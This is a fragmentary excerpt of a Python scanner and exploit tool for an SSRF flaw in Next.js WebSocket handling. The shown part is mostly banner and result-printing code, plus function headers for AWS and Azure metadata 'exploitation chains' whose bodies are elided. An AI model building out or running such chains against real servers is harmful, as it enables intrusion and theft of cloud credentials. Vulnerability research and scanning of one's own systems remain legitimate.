...
║             @rXploit / BONEKSIBER — Bug Bounty Tooling        ║
╚══════════════════════════════════════════════════════════════╝
...
║                                                                                      ║
╠══════════════════════════════════════════════════════════════════════════════════════╣
║{W}                     NextSSRF — CVE-2026-44578 Scanner & Exploit                      {G}║
║{DIM}                     Next.js WebSocket Upgrade Handler SSRF                           {G}║
║{DIM}                     Affected: 13.4.13-15.5.15 | Fixed: 15.5.16/16.2.5                {G}║
╚══════════════════════════════════════════════════════════════════════════════════════╝{RESET}
""")
...
def hit_box(title, data):
    print(f"\n{G}┌──────────────────────────────────────────────────────────┐{RESET}")
    print(f"{G}│{RESET} {R}{BOLD}🎯 {title:<53}{RESET} {G}│{RESET}")
    print(f"{G}├──────────────────────────────────────────────────────────┤{RESET}")
    for k, v in data.items():
        val_str = str(v)[:32] + "..." if len(str(v)) > 32 else str(v)
        print(f"{G}│{RESET}  {Y}{k:<20}{RESET} : {G}{BOLD}{val_str:<31}{RESET} {G}│{RESET}")
    print(f"{G}└──────────────────────────────────────────────────────────┘{RESET}\n")

def exploit_aws(host, port, use_ssl, timeout=8):
    results = {}
    print(f"\n{G}┌──────────────────────────────────────────────────────────┐{RESET}")
    print(f"{G}│{RESET} {BOLD}       AWS IMDSv1 Exploitation Chain              {RESET} {G}│{RESET}")
    print(f"{G}└──────────────────────────────────────────────────────────┘{RESET}")
...
def exploit_azure(host, port, use_ssl, timeout=8):
    results = {}
    print(f"\n{G}┌──────────────────────────────────────────────────────────┐{RESET}")
    print(f"{G}│{RESET} {BOLD}       Azure IMDS Exploitation Chain              {RESET} {G}│{RESET}")
    print(f"{G}└──────────────────────────────────────────────────────────┘{RESET}")
...
def summary(results):
    ...
    print(f"\n{G}┌──────────────────────────────────────────────────────────┐{RESET}")
    print(f"{G}│{RESET} {BOLD}          NextSSRF — CVE-2026-44578 Summary              {RESET} {G}│{RESET}")
    print(f"{G}├──────────────────────────────────────────────────────────┤{RESET}")
    print(f"{G}│{RESET}  Scanned        : {len(results):<39} {G}│{RESET}")
    print(f"{G}│{RESET}  {R}Vulnerable     : {len(vuln):<39}{RESET} {G}│{RESET}")
    print(f"{G}│{RESET}  {R}SSRF Confirmed : {len(hits):<39}{RESET} {G}│{RESET}")
    print(f"{G}└──────────────────────────────────────────────────────────┘{RESET}")
    if hits:
